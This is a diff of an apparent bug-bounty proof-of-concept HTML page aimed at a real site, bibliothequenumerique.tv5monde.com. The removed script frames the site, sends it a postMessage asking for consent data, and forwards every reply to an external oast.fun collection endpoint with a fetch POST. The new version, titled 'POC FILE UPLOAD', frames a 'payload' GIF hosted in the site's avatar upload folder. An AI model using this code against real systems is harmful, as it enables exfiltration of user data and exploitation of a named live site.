@@ -3,44 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Document</title>
-  <style>
-	  * {
-		  margin: 0;
-		  padding: 0;
-		  box-sizing: border-box;
-	  }
-	  html, body {
-		  width:100%;
-		  height:100%;
-	  }
-	  iframe {
-		  width: 100%;
-		  height: 100vh;
-		  border: none;
-	  }
-  </style>
+  <title>POC FILE UPLOAD</title>
 </head>
 <body>
-	<iframe id="victim" width="800" height="600" src="https://bibliothequenumerique.tv5monde.com/"></iframe>
-		
-	<script>	
-		// Di halaman kamu (parent)
-	const frame = document.querySelector('iframe')
-
-	frame.contentWindow.postMessage(
-	  { __tcfapiCall: { command: "getTCData", parameter: null, callId: 1 } },
-	  "https://bibliothequenumerique.tv5monde.com"  // atau spesifik: "https://bibliothequenumerique.tv5monde.com"
-	)
-
-	// Tangkap balasannya
-	window.addEventListener("message", (e) => {
-  // Kirim ke server kamu
-  fetch("https://jzrpbmibsfzyrbvfiaeqsoqbikltlqpdw.oast.fun/collect", {
-    method: "POST",
-    body: JSON.stringify(e.data)
-  })
-})
-</script>
+	<iframe id="victim" width="800" height="600" src="https://bibliothequenumerique.tv5monde.com/upload/avatars/payload-6a0d92f9eb9e0.gif"></iframe>
 </body>
 </html>
